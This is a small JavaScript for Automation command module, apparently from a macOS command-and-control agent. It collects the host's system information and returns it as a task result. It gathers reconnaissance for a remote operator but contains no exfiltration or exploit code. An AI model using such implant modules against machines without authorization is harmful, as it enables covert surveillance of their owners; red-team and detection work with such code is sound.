exports.system_info = function(task, command, params){
    let method = "jxa";
    let data = "";
    try{
        if(params.length > 0){
            data = JSON.parse(params);
            if(data.hasOwnProperty('method') && data['method'] !== ""){
                method = data['method'];
            }
        }
        if(method === "jxa"){
            let output = JSON.stringify(currentApp.systemInfo(), null, 2);
            return {"user_output":output, "completed": true};
        }else{
            return {"user_output":"Method unknown", "completed": true, "status": "error"};
        }
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
COMMAND_ENDS_HERE